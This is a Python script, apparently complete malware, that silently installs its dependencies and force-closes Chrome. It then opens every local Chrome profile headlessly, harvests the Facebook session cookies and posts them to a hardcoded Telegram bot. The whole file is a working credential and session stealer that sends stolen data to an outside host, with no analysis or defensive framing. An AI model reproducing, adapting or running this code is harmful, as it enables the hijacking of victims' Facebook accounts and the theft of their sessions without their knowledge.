import os
import sys
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests
from multiprocessing import Pool

TOKEN = '7533821284:AAGDsLUDpZYbfzdghq8QihpeHXfhzGIP43I'
CHAT_ID = '1174455752'
TELEGRAM_API = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'

def install_libraries():
    required_libs = ["requests", "webdriver_manager", "selenium"]
    subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for lib in required_libs:
        if subprocess.run([sys.executable, "-c", "import " + lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            subprocess.run([sys.executable, "-m", "pip", "install", lib], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def close_chrome():
    subprocess.run("taskkill /F /IM chrome.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def check_chrome_installed():
    possible_paths = [
        os.path.join(os.getenv("ProgramFiles", "C:\\Program Files"), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)"), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("LOCALAPPDATA", "C:\\Users\\" + os.getenv("USERNAME")), "Google", "Chrome", "Application", "chrome.exe"),
    ]
    return any(os.path.exists(path) for path in possible_paths)

def get_cookies_from_profile(profile_name):
    options = Options()
    options.add_argument('--headless=new')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    user_data_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
    options.add_argument("user-data-dir=" + user_data_dir)
    options.add_argument("profile-directory=" + profile_name)

    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        driver.get('https://www.facebook.com/')
        WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
        driver.quit()
        return cookies
    except:
        return None

def process_profile(profile):
    cookies = get_cookies_from_profile(profile)
    return (profile, cookies) if cookies else None

def cookies_to_header_string(cookies):
    return "; ".join(c['name'] + "=" + c['value'] for c in cookies) if cookies else "Không có cookies!"

def send_telegram(profile_cookies):
    message = "\n\n".join(f"Profile: {p}\n{cookies_to_header_string(c)}" for p, c in profile_cookies.items()) or "Không lấy được cookies!"
    requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message}, timeout=5)

if __name__ == "__main__":
    install_libraries()
    if not check_chrome_installed():
        sys.exit(1)
    close_chrome()

    user_data_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
    profiles = [item for item in os.listdir(user_data_dir) if os.path.isdir(os.path.join(user_data_dir, item)) and (item.startswith("Profile ") or item == "Default")] if os.path.exists(user_data_dir) else []

    with Pool() as pool:
        results = pool.map(process_profile, profiles)
    profile_cookies = {p: c for r in results if r for p, c in [r]}

    send_telegram(profile_cookies)
